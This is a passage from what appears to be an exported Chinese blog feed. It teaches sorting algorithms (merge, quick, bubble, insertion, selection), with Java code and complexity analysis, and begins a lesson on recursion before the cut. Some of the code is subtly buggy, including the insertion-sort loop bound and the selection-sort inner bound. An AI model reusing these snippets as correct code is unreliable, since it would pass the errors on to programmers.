= 16*T(\frac{n}{16}) + 4*n \\[2ex]&amp;= …… \\[2ex]&amp;= 2^{k} * T(\frac{n}{2^{k}}) + k * n\end{align*}$$ 这样一步步推导，我们可以得到$T(n) \ = \ 2^{k} * T(\frac{n}{2^{k}}) + k * n $。当$T(\frac{n}{2^{k}})=T(1)$时，也就是$\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \ = \ Cn + n*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n*log_{2}n)$。所以归并排序的时间复杂度是$O(n*log_{2}n)$。 从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n*log_{2}n)$。 第三、归并排序是不是原地排序算法呢？ 归并排序的时间复杂度在任何情况下都是$O(n*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。 这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n*log_{2}n)$，该如何分析呢？ 如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？ 实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。 快速排序的原理 我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。 快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。 第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。 根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。 如果我们用递推公式来将上面的过程写出来的话，就是这样： 12345# 递推公式quick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)# 终止条件p&gt;=r 我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private static void quickSort(int[] arr, int n) &#123; if (n &lt; 1) return; quickSort(arr, 0 , n-1);&#125;private static void quickSort(int[] arr, int left, int right) &#123; if (left&gt;=right) return; int mid = partation(arr, left, right); quickSort(arr, left, mid-1); quickSort(arr, mid+1, right);&#125;// 查找中间位置private static int partation(int[] arr, int left, int right) &#123; int base = arr[left]; int i = left, j = right; while(i&lt;j)&#123; while (i&lt;j &amp;&amp; arr[j] &gt;= base) j--; while (i&lt;j &amp;&amp; arr[i] &lt;= base) i++; if (i&lt;j)&#123; int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125; &#125; arr[left] = arr[i]; arr[i] = base; return i;&#125;// 查找中间位置private static int partation1(int[] a, int left, int right)&#123; int pivot = a[right]; int i = left; for (int j=left; j&lt;=right-1;j++)&#123; if (a[j]&lt;pivot)&#123; int temp = a[i]; a[i] = a[j]; a[j] = temp; i++; &#125; &#125; a[right] = a[i]; a[i] = pivot; return i;&#125; 归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p…r]分区，函数返回pivot的小标。 如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p…r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p…r]中。 不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p…r]原地完成分区操作。 原地分区函数的实现思路非常巧妙，我下面用伪代码实现： 12345678910111213partation(a,p,r)&#123; pivot := A[r] i := p; for j:=p to r-1 do &#123; if A[j] &lt; pivot&#123; swap A[i] with A[j] i := i+1 &#125; &#125; swap A[i] with A[r] return i&#125; 这里的处理有点类似于选择排序。我们通过游标i把A[p…r-1]分成了两部分，A[p…i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i…r-1] 是“未处理区间”。我们每次从未处理区间A[i…r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。 数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。 因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。 到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？ 可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。 快速排序的性能分析 现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。 快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n*log_{2}n)$。 $$\begin{cases} \\\ T(1) = C; &amp; n=1 \\[2ex]\ T(n) = 2*T(\frac{n}{2}) + n; &amp; n&gt;1\end{cases}$$ 但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。 我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n*log_{2}n)$退化成了$O(n^2)$。 我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？ 实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。 解答开篇 快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。 我们选择数组区间A[p…r]最后一个元素A[n-1]作为pivot，对数组A[0…n-1]进行原地分区，这样数组就分成了三部分，A[0…p-1]、A[p]、A[p+1…n-1]。 如果p+1=K，那么A[p]就是要求解的元素，如果K&gt;p+1，说明第K大元素出现在A[p+1…n-1]区间内，我们再按照上面的思路在A[p+1…n-1]内查找。同理，如果K&lt; p+1，那我们就在A[0…p-1]区间内查找。 我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？ 第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16……直到区间缩小为1. 如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+……+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。 内容小结 归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。 归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。 快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。 课后思考1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？ 多路归并、外排序 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>快速排序</tag>
        <tag>归并排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-排序(上)]]></title>
    <url>%2Fposts%2F2018-09-20-%E7%AE%97%E6%B3%95-%E6%8E%92%E5%BA%8F(%E4%B8%8A).html</url>
    <content type="text"><![CDATA[前言 排序对一个程序员来说，可能都不会陌生。大部分编程语言中，也都提供了排序函数。在平常的项目中，也经常会用到排序。排序非常重要，所以会分几节详细讲一讲经典的排序算法。 排序算法太多了，可能有的连名字都没有听说过，比如猴子排序、睡眠排序、面条排序等等。这里只列举众多排序算法众多的一小撮，也是最经典的、最常用的：冒泡排序、插入排序、选择排序、归并排序、快速排序、计数排序、基数排序、桶排序。按照时间复杂度把他们分成了三类，分上中下三节来讲。 排序算法 时间复杂度 是否基于比较 上 冒泡、插入、选择 $ O(n^2) $ √ 中 快排、归并 $ O(nlogN) $ √ 下 桶、计数、基数 $ O(n) $ × 带着问题去学习，是最有效的学习方法。所以按照惯例，先给出思考题：插入排序和冒泡排序的时间复杂度相同，都是$O(n^2)$，在实际软件开发里，为什么更倾向于使用插入排序而不是冒泡排序呢？ 如何分析一个排序算法 学习排序算法，除了学习他的算法原理、代码实现之外，更重要的是学会如何评价、分析一个排序算法。那么要分析一个排序算法，要从哪几方面入手呢？ 一、 算法的执行效率对于排序算法的执行效率的分析，我们一般会从以下几点来进行衡量： 1、最好情况、最坏情况、平均情况时间复杂度 我们在分析排序算法的时间复杂度时，要分别给出最好情况、最坏情况、平均情况下的时间复杂度。除此之外，你还要说出最好情况、最坏情况时间复杂度对应的要排序的原始数据是什么样。 为什么要区分这三种时间复杂度呢？第一，有些排序算法会区分，为了好对比，我们最好都做一下区分。第二，对于要排序的数据，有的接近有序，有的接近无序。有序度不同的数据集，对于排序的执行时间肯定会有影响的，我们要知道排序算法在不同数据下的性能表现。 2、时间复杂度的系数、常数、低阶 我们知道，时间复杂度反应的是数据规模n很大的时候的一个增长趋势，所以它表示的时候会忽略系数、常数、低阶。但是实际的软件开发中，我们排序的可能是10个、100个、1000个这样数据规模较小的数据，所以，在对同一阶时间复杂度的排序算法性能对比的时候，我们就要把系数、常数、低阶也考虑进来。 3、比较次数和交换次数 这一节和下一节讲的都是基于比较的排序算法。基于比较的排序算法的执行过程中，会涉及两种操作，一个是元素比较大小，另一个是元素交换或移动。所以，如果我们在分析排序算法的执行效率的时候，应该把比较次数和交换次数考虑进去。 二、 算法的内存消耗前面讲过算法的内存消耗可以通过空间复杂度来衡量，排序算法也不例外。不过针排序算法的空间复杂度，我们引入一个新概念，原地排序。原地排序算法，就是特指空间复杂度为O(1)的排序算法，我们这节讲的三种排序算法都是原地排序算法。 三、 排序算法的稳定性仅仅用执行效率和内存消耗来衡量排序算法的好坏是不够的。针对排序算法，我们还有一个重要的度量指标，稳定性。这个概念是说，如果待排序的序列中存在值相同的元素，经过排序之后，相等元素之间原有的先后顺序不变。 我通过一个例子来解释一下。比如我们有一组数据2,9,3,4,8,3，按照大小排序之后就是2,3,3,4,8,9。 这组数据里有两个3，经过某种排序算法排序之后，如果两个3的前后顺序没有改变，那我们就把这种排序算法叫做稳定的排序算法；如果前后顺序发生变化，那对应的排序算法就叫做不稳定的排序算法。 你可能要问了，这两个3哪个在前，哪个在后有什么关系啊。稳不稳定又有什么关系呢？为什么要考察排序算法的稳定性呢？ 很多数据结构和算法的课程，再讲排序的时候，都是用整数来举列的。但在真正的软件开发中，我们要排序的往往不是单纯的整数，而是一组对象，我们需要按照对象的某个key来排序。 比如说，我们现在要给电商交易系统的“订单”排序，订单有两个属性，一个是下单时间，一个是订单金额。如果我们现在有10万条订单数据，我们希望按照订单金额从小到大对订单数据进行排序，对于金额相同的订单，我们希望按照下单时间从早到晚有序，对于这样一个排序需求，我们怎么来做呢？ 最先想到的方法是，我们先按照金额对订单数据进行排序，然后，在遍历排序之后的订单数据，对于每个金额相同的小区间再按照下单的时间排序。这种排序思路理解起来不难，但是实现起来会很复杂。 但是借助稳定排序算法，这个问题可以非常简洁的解决。解决思路是这样的，我们先按照下单时间给订单排序，注意是下单时间，不是订单金额，排序完成之后，我们再用稳定排序算法，按照订单金额重新排序。这样两遍排序之后，我们得到的就是订单数据按照金额大小从小到大排序，金额相同的订单按照下单时间从早到晚排序的。为什么呢？ 稳定排序算法可以保持金额相同的两个对象，再排序前后的顺序保持不变。第一次排序之后，所有的订单按照下单时间从早到晚有序了。在第二次排序中，我们用的是稳定的排序算法，所以经过第二次排序之后，相同金额的订单仍然保持下单时间从早到晚有序。 冒泡排序 我们从冒泡排序开始，学习今天的三种排序算法。 冒泡排序只会操作相邻的两个数据。每次冒泡排序都会对相邻的两个数据进行比较，看是否满足大小关系要求，如果不满足就让它两互换。一次冒泡会让至少一个元素移动到它应该在的位置，重复n次，就完成了对n个数据的排序工作。 我用一个例子，带你看下冒泡排序的整个过程。我们要对一组数据4,5,6,3,2,1，从小到大进行排序。第一次冒泡排序的详细过程就是这样： 可以看出，经过第一次冒泡排序之后，6这个元素已经存储在正确的位置上了。要想完成所有数据的排序，我们只需要进行6次这样的冒泡排序操作就对了。 实际上，刚才的冒泡排序还可以优化，当某次操作已经没有数据交换时，说明已经完全有序，不需要在执行后续的冒泡操作了。我这里给一个例子，这里面给6个元素排序，只需要4次冒泡操作就可以了。 冒泡次数 冒泡结果 是否有数据交换 初始状态 3，5，4，1，2，6 - 第一次冒泡 3，4，1，2，5，6 有 第二次冒泡 3，1，2，4，5，6 有 第三次冒泡 1，2，3，4，5，6 有 第四次冒泡 1，2，3，4，5，6 无，结束排序操作 冒泡排序算法的原理比较好理解，具体的代码如下，你可以结合代码理解原理。 123456789101112131415// 冒泡排序 a表示需要排序的数组 n表示数组的大小public void bubbleSort(int[] a,int n)&#123; for(int i=0;i&lt;n-1;i++)&#123; boolean flag = false; for(int j=0;j&lt;n-1-i;j++)&#123; if(a[j]&gt;a[j+1])&#123; int temp = a[j]; a[j] = a[j+1]; a[j+1] = temp; flag = true; &#125; &#125; if(!flag) break; &#125;&#125; 现在结合上面分析算法的三个方面，有三个问题要问你。 第一、冒泡排序是原地排序算法吗？ 冒泡的过程只涉及相邻两个数据的交换操作，字需要一个常量级的临时空间，所以它的空间复杂度是O(1)，是一个原地排序算法。 第二、冒泡排序是稳定的排序算法吗？ 在冒泡排序中，只有交换才可以改变两个元素的前后位置。为了保证冒泡排序算法的稳定性，当有相邻的两个元素相等时，我们不做交换，相同大小的数据在排序前后不改变顺序，所以冒泡排序算法是稳定的排序算法。 第三、冒泡排序的时间复杂度是多少？ 最好的情况下，要排序的数据已经是有序的了，我们只需要进行一次冒泡排序就可以了，所以最好的时间复杂度为$O(n)$。而在最坏情况下，要排序的数据是倒序排列的，我们需要进行n次冒泡排序，所以最坏情况时间复杂度为$O(n^2)$。 最好、最好情况时间复杂度很容易区分，那平均情况时间复杂度是多少呢？我们前面讲过，平均时间复杂度就是加权平均期望时间复杂度，分析的时候要结合概率论的知识。 对于包含n个元素的数组，这n个数据有 n! 种排列方式。不同的排列方式，冒泡排序执行的时间是不同的。比如我们前面举的那个例子，一个需要6次冒泡，而另一个只需要4次。如果用概率论的方法定量分析平均时间复杂度，那涉及到的数学推理和计算就会很复杂。我这里还有一种思路，通过有序度和逆序度这两个概念来分析。 有序度是数组中具有有序关系的元素对的个数。有序元素对用数学表达式表示就是这样： $a[i] &lt;= a[j], 如果i &lt; j$。 2,4,3,1,5,6 这组数据的有序度为11。因其有序元素对为11个，分别是: (2,4) (2,3) (2,5) (2,6) (4,5) (4,6) (3,5) (3,6) (1,5) (1,6) (5,6) 同理，对于一个倒序排列的数组，比如 6,5,4,3,2,1，有序度为0；对于一个完全有序的数组，比如1,2,3,4,5,6，有序度就是n*(n-1)/2，也就是15.我们把完全有序的数组的有序度叫做满有序度。 逆序度的定义正好跟有序度的定义相反(默认从小到大为有序)，我想你已经想到了。关于逆序度，我们就不举例子说明了。你可以结合有序度的例子自己看一下：$a[i] &gt; a[j], 如果i &lt; j$。 关于这三个概念，我们可以得到一个公式：逆序度 = 满有序度 - 有序度。我们排序的过程就是一种增加有序度，减少逆序度的过程，最后达到满有序度，就说明排序完成了。 我还是拿前面举得那个冒泡排序的例子说明。要排序的数组的初始状态为4,5,6,3,2,1，其中，有序元素对(4,5)、(4,6)、(5,6)，所以有序度为3。 n=6，所以排序完成之后终态的满有序度为15. 冒泡次数 冒泡结果 有序度 初始状态 4，5，6，3，2，1 3 第一次冒泡 4，5，3，2，1，6 6 第二次冒泡 4，3，2，1，5，6 9 第三次冒泡 3，2，1，4，5，6 12 第四次冒泡 2，1，3，4，5，6 14 第五次冒泡 1，2，3，4，5，6 15 冒泡排序包含两个原子操作，比较和交换。每交换一次，有序度就加1,。不管算法怎么改进，交换次数是确定的，即为逆序度，也就是n*(n-1)/2 - 初始有序度。此例中就是15-3=12，也就是要进行12次交换操作。 对于包含n个数据的数组进行冒泡排序，平均交换次数是多少呢？最坏情况下，初始状态的有序度为0，所有要进行n*(n-1)、2次交换。最好情况下，初始状态的有序度为满有序度，就不需要进行交换。我们去平均值n*(n-1)/4，来表示初始有序度既不是很高也不是很低的平均情况。 换句话说，平均情况下需要n*(n-1)/4次交换操作，比较操作肯定要比交换操作多，而时间复杂度的上限位$O(n^2)$，所以平均情况下的时间复杂度就是$O(n^2)$。 这个平均时间复杂度的推导过程并不严格，但是很多时候很有用，毕竟概率论的定量分析太复杂，不太好用。 插入排序 我们先来看一个问题。如果一个有序的数组，我们往里面添加一个新的数据后，如何继续保持数据有序呢？很简单，我们只要遍历数组，找到数据应该插入的位置将其插入即可。 这是一个动态排序的过程，即动态的往有序集合中添加数据，我们可以通过这种方法保持集合中的数据一直有序。而对于一组静态数据，我们也可以借鉴上面讲的插入方法，来进行排序，于是就有了插入排序算法。 那插入排序是如何借助上面的思想来实现排序的呢？ 首先，我们将数组中的数据分为两个区间，已排序区间和未排序区间。初始已排序区间只有一个元素，就是数组中的第一个元素。插入排序算法的核心思想是取未排序区间的元素，在已排序区间中找到合适的位置插入，并保证已排序区间中的元素一直有序，重复这个过程，知道未排序区间中元素为空，算法结束。 如图所示，要排序的数据是4,5,6,1,3,2，其中左侧为已排序区间，右侧为未排序区间。 插入排序也包含两种操作，一种是元素的比较，一种是元素的移动。当我们需要将一个元素a插入到已排序区间时，需要先拿a和已排序区间的元素一次比较大小，找到合适的位置插入。找到插入点之后，我们还需要将插入点之后的额元素顺序往后移动一位，这样才能腾出空间为元素a插入。 对于不同的查找插入点的方法（从头到尾、从尾到头），元素的比较次数是有区别的。但对于一个给定的初始序列，移动操作的次数是固定的，就等于逆序度。 为什么说移动次数就等于逆序度呢？我拿刚才的例子画一个图表，你一看就明白了。满有序度是n*(n-1)/2=15, 初始有序度为5，所以逆序度为10,。插入排序中，数据移动的个数总和也等于3+3+4=10。 插入排序的原理也很简单吧。你也可以结合一下代码理解插入排序： 123456789101112131415public void insertSort(int[] a, int n)&#123; if(n&lt;=1) return; for(int i=1;i&lt;n;i++)&#123; int val = a[i]; int j=i-1; for(;j&gt;0;j--)&#123; if(a[j]&gt;val)&#123; a[j+1] = a[j]; &#125;else &#123; break; &#125; &#125; a[j+1] = val; &#125;&#125; 现在同样有三个问题。 第一、插入排序是原地排序算法吗？ 从实现过程可以明显的看出，插入排序的运行不需要额外的存储空间，所以插入排序的空间复杂度为O(1)，是一个原地排序算法。 第二、插入排序是稳定的排序算法吗？ 在插入排序中，对于值相同的元素，我们可以选择将后面出现的元素，插入到前面出现的元素的后面，这样就可以保持原有的前后顺序不变，所有插入排序是稳定排序算法。 第三、插入排序的时间复杂度是多少？ 如果要排序的数据已经是有序的，我们并不需要搬移任何数据。如果我们从尾到头在有序数组里查找插入位置，每次只需比较一个数据就能确定插入的位置。所以这种情况下，最好是时间复杂度为O(n)。注意，这里是从尾到头遍历已经有序的数据。 如果数组是倒序的，每次插入都相当于在数组的第一个位置插入新的数据，所以需要搬移大量的数据，所以最坏情况下的时间复杂度为$O(n^2)$。 还记得我们在一个数组中插入一个数据的平均复杂度是多少吗？没错，是O(n)，所以对于插入排序来说，每次插入操作都相当于在数组中插入一个数据，执行n次插入操作，所以平均时间复杂度为$O(n^2)$。 选择排序 选择排序算法的实现思路有点类似插入排序，也分已排序区间和未排序区间。但是选择排序每次会从未排序区间中找到最小元素，将其放到已排序区间的末尾。 同样，也有三个问题需要你思考。 第一、插入排序是原地排序算法吗？ 首先选择排序的空间复杂度为O(1)，所以是一种原地排序算法。 第二、插入排序的时间复杂度是多少？ 选择排序最好情况时间复杂度、最坏情况时间复杂度、平均情况时间复杂度均为$O(n^2)$。你可以自己分析看看。 第三、插入排序是稳定的排序算法吗？ 答案是否定的，选择排序是一种不稳定的排序算法。从选择排序的原理示意图可以看出，选择排序每次都要找剩余排序元素中的最小值，并和前面元素交换位置，这就破坏了稳定性。 比如5,8,5,2,9这样一组数据，使用选择排序来排序的话，第一次找到最小元素2，与第一个5交换位置，那第一个5个中间5的顺序就变了，所以就不稳定了。正是因此，相对于冒泡排序和插入排序，选择排序就稍微逊色了。 1234567891011public void selectSort(int[] a, int n)&#123; for(int i=0;i&lt;n-1;i++)&#123; for(int j=i+1; j&lt;n-1;j++)&#123; if(a[j]&lt;a[i])&#123; int temp = a[j]; a[j] = a[i]; a[i] = temp; &#125; &#125; &#125;&#125; 解答开篇 基本的知识都讲完了，我们来看看开篇的问题：冒泡排序和插入排序的时间复杂度都为$O(n^2)$，都是原地排序算法，为什么插入排序要比冒泡排序更受欢迎呢？ 我们前面分析冒泡排序和插入排序的时候讲到，冒泡排序不管怎么优化，元素交换的次数是一个固定的值，是原始数据的逆序度。插入排序是同样的，不管怎么优化，移动次数等于原始数据的逆序度。 但是从代码实现上来看，冒泡排序的数据交换要比插入排序的数据移动要复杂，冒泡排序需要3个赋值操作，而插入排序只需要一个。我们来看一下下面这段操作： 1234567891011121314// 冒泡排序中的数据交换操作 if(a[j]&gt;a[j+1])&#123; int temp = a[j]; a[j] = a[j+1]; a[j+1] = temp; flag = true;&#125;// 插入排序中数据移动操作if(a[j]&lt;val)&#123; a[j+1] = a[j];&#125;else &#123; break;&#125; 我们把执行一个赋值语句的时间粗略的估计为单位时间unit_time，然后分别用冒泡排序和插入排序对同一个逆序度为K的数组进行排序。用冒泡排序需要K次交换操作，每次需要3个赋值语句，所以交换操作总耗时就是3K单位时间。而插入排序中数据移动操作只需要K个单位时间。 所以，虽然冒泡排序和插入排序的时间复杂度是一样的，但是如果我们希望把性能优化做到极致，那肯定首选插入排序。插入排序的算法思路也有很大的优化空间，我们只讲了最基础的一种。如果你对插入排序的优化感兴趣，可以自己学习一下希尔排序。 内容小结 想要分析、评价一个排序算法，需要从执行效率、内存消耗和稳定性三个方面来看。因此这一节，分析了三种时间复杂度为$O(n^2)$的排序算法：冒泡排序、插入排序、选择排序。需要重点掌握的是它们的分析方法。 排序算法 是否原地排序 是否稳定 最好 最坏 平均 冒泡排序 √ √ $O(n)$ $O(n^2)$ $O(n^2)$ 插入排序 √ √ $O(n)$ $O(n^2)$ $O(n^2)$ 选择排序 √ × $O(n^2)$ $O(n^2)$ $O(n^2)$ 这三种时间复杂度为$O(n^2)$的排序算法中，冒泡排序、选择排序可能就纯粹停留在理论的层面了，实际开发中应用并不多，但是插入排序还是挺有用的。后面讲排序优化的时候，有些语言的排序函数的实现会用到插入排序算法。 今天讲的三种算法，实现代码都非常简单，对于小规模的数据排序，用起来非常高效，但是在大规模数据排序的时候，这个时间复杂度就稍微有点高了。所以我们更倾向于使用下一节讲的时间复杂度为$O(n*logn)$的排序算法。 课后思考我们讲过，特定的算法是依赖于特定的数据结构的。我们今天讲的几种排序算法，都是基于数组实现的。如果数组存储在链表中，这三种排序算法还能工作吗？如果能，相应的时间、空间复杂度又是多少？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>排序</tag>
        <tag>冒泡排序</tag>
        <tag>插入排序</tag>
        <tag>选择排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-递归]]></title>
    <url>%2Fposts%2F2018-09-18-%E7%AE%97%E6%B3%95-%E9%80%92%E5%BD%92.html</url>
    <content type="text"><![CDATA[前言 推荐注册返佣金这个功能我想你应该不陌生吧？现在很多app都有这个功能。这个功能中，用户A推荐用户B注册，用户B又推荐了用户C注册，我们可以说C的“最终推荐人”为用户A，用户B的“最终推荐人”也为用户A，用户A没有“最终推荐人”。 一般来说，我们会通过数据库记录这种推荐关系，在数据库表中，我们可以记录两行数据，其中actor_id表示用户id，referrer_id表示推荐人id。 actor_id referer_id B A C B 基于这个背景，我的问题是，给定一个用户ID，如何查找这个用户的“最终推荐人”？ 带着这个问题，我们来学习今天的内容，递归（Recursion）！ 如何理解递归 从我自己学习数据结构和算法的经历来看，我个人觉得，有两个最难理解的知识点，一个是动态规划，另一个就是递归。 递归是一种应用非常广泛的算法，之后很多的数据结构和算法的编码实现都要用到递归，比如DFS深度优先搜索，前中后序二叉树遍历等等，所以，搞懂递归非常重要，否则，后面复杂一点的数据结构和算法学起来就会比较吃力。 不过，别看我说了这么多，递归本身可一点不“高冷”，我们生活中就有很多用到递归的例子。 比如周末你带着女朋友去电影院看电影，女朋友问你，我们坐在第几排？电影院太黑了，没法数，现在你怎么办？ 这时候递归就派上用场了，于是你问前面一排的人他是第几排，你想只要在他的数字上加一，就知道自己在那一排了。但是，前面的人也不清楚，所以他也问他前面的人，就这样一排一排往前问，直到问道第一排的人，说我在第一排，然后在这样一排一排再把数字传回来，直到你前面的人告诉你他在那一排，于是你就知道答案了。 这就是一个标准的用递归求解问题的分解过程，去的过程叫“递”，回来的过程叫“归”。基本上，所有的递归问题都可以用递推公式来表示，刚刚这个生活中的例子，我们用递推公式来表示就是下面这样的 $$ f(n) = f(n-1) +1 ;\ 其中f(1)=1 $$ f(n)表示你想知道自己在那一排，f(n-1) 表示前面一个人所在的排数，f(1)=1表示第一排的人知道自己在第一排。有了这个递推公式，我们就可以很轻松的将它改为递归代码：1234int f(int n)&#123; if(n==1) return 1; return f(n-1)+1;&#125; 什么时候可以用递归呢 刚刚这个例子是典型的递归，那究竟什么问题可以用递归来解决呢？我这总结了三个条件，只要同时满足以下三个条件，就可以用递归来解决 。 1、一个问题的解可以分解为几个子问题的解 何为子问题？子问题就是数据规模更小的问题。比如，前面的电影院的例子，你要知道自己在哪排，可以分解为”前一排的人在那一排？”这样一个子问题。 2、这个问题与分解之后的子问题，除了数据规模不同，求解思路完全一样 还是以电影院的例子说明，你求解“自己在那一排”，和前面的人求解“自己在那一排”的思路，是完全一样的。 3、存在递归终止条件 把问题分解为子问题，再把子问题分解为子子问题，一层一层分解，不能存在无限循环，这就需要存在终止条件。在电影院的例子中，第一排的人不需要再继续询问任何人，就知道自己在那一排，也就是f(1)=1，这就是递归的终止条件。 如何写递归代码 说了这么多，那如何写递归代码呢？个人觉得，写递归代码最关键的是写出递推公式，找到终止条件，剩下将递推公式转化为代码就很容易了。 我这里举个例子，来一步一步实现递归代码。 如果有n个台阶，每次你可以跨 1 个台阶或者 2 个台阶，请问走完这n个台阶有多少种走法？ 如果有7个台阶，你可以走2、2、2、1这样上去，也可以走1、2、1、1、2这个样子上去，总之有很多中走法，那如何用编程来求总共有多少种走法呢？ 我们仔细想一下，实际上，可以根据第一步的走法把所有走法分为两类，第一类是第一步走了1个台阶，另一类是第一步走了2个台阶，所以，n个台阶的走法就等于先走一个台阶后，n个台阶的走法加上先走2个台阶后，n-2个台阶的走法，用公式表示就是：$$f(n) = f(n-1) + f(n-2) $$ 有了递推公式，递归代码基本就完成了一半。我们再来看下终止条件。当有一个台阶时，我们不需要再继续递归，就只有一种走法，所以f(1)=1。那么这个终止条件够吗？我们可以用n=2，n=3这些较小的数实验一下。 